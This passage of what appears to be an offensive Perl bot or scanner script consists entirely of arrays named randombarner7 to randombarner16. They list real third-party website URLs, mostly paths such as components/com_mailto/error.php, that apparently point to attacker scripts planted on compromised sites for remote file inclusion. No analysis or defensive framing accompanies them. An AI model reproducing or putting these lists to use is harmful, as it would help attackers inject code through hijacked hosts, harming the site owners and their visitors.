rors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner7  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner8  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner9  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner10  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://p.istu.ru//components/com_mailto/error.php","http://www.telsonet.pl/errors.php","http://www.modelismonaval.com/components/com_user/class-mail.php","http://optim.gim.med.up.pt/components/com_mailto/error.php","http://www.picturethismenu.com/errors.php","http://www.seccons.de/components/com_mailto/error.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://pollenz.net/components/com_banners/error.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner11  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner12  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner13  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner14  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

my @randombarner15  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");



my @randombarner16  = ("http://www.flowdynamicsinc.com/errors.php","http://www.aramea.co/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://imotionasia.com.vn/errors.php","","http://www.astcl.com/astcl/components/com_mailto/error.php","http://www.vacanzeincampagna.it/components/com_weblinks/views/errors.php","http://turismo.uladech.edu.pe/components/com_mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://w2.portais.atrio.scire.net.br/upe-ppte/components/com_mailto/error.php","http://www.petropolis.rj.gov.br/intranet/components/com_mailto/error.php","http://www.dzo.ufla.br/pet/components/com_mailto/error.php","http://www.anz.udo.edu.ve/components/com_mailto/error.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.photodesign.uncanny.cz/images/error.php","http://titiprindu.com/errors.php","http://www.solucionesparati.net/CMS2008/images/error.php.1","http://wavevent.fr/administrator/components/com_weblinks/views/errors.php","http://www.rapidsweddings.com/errors.php","http://www.ski-freizeit-reisen.de/components/com_mailto/error.php","http://isanew.grupomathile.com.br/errors.php","http://titiprindu.com/errors.php","http://totalfish.hu/errors.php/errors.php","http://www.picturethismenu.com/errors.php","http://www.rapidsweddings.com/errors.php","http://www.flowdynamicsinc.com/errors.php","http://allindustrialcorp.com/errors.php","http://priorityelectricutility.com/errors.php","http://all-cylinders.com/errors.php","http://snscylinders.com/errors.php","http://www.fcors.com.br/modules/mod_banners/error.php","http://www.bortolotto.eu/plugins/editors/error.php","http://www.flowdynamicsinc.com/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://pictoborden.nl/site/media/mailto/error.php","http://www.bendit.co/backside/media/mailto/error.php","http://www.gambinigroup.it/media/mailto/error.php","http://rothwellscouts.com/media/mailto/error.php","http://www.alvestaguesthouse.co.za/wp-content/themes/welcome_inn/cache/pro.php","http://www.infobeton.fr/administrator/components/com_weblinks/views/errors.php","http://www.rpdoarmmgov.ph/redpb/components/com_mailto/error.php","http://www.pebk.de/joomla/components/com_mailto/error.php","http://upgrade.3t.aprs.la/components/com_mailto/error.php","http://www.theatresprives.com/errors.php","http://www.allcam.org/errors.php","http://www.pastorbonus.sk/errors.php","http://circuitec.com.br/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://www.thewigmall.com/errors.php","http://blahaoffroadteam.hu/errors.php","http://www.geld-verdienen-online.org/errors.php","http://www.cannell-immobilier.com/errors.php","http://www.allcam.org/errors.php","http://blahaoffroadteam.hu/errors.php","http://pliki.modr.mazowsze.pl/media/mailto/error.php","http://totalfish.hu/errors.php/errors.php","http://www.iestpjasdc.edu.pe/contabilidad/components/com_mailto/error.php","http://www.flowdynamicsinc.com/errors.php","http://www.gambinigroup.it/media/mailto/error.php","http://www.pastorbonus.sk/errors.php");

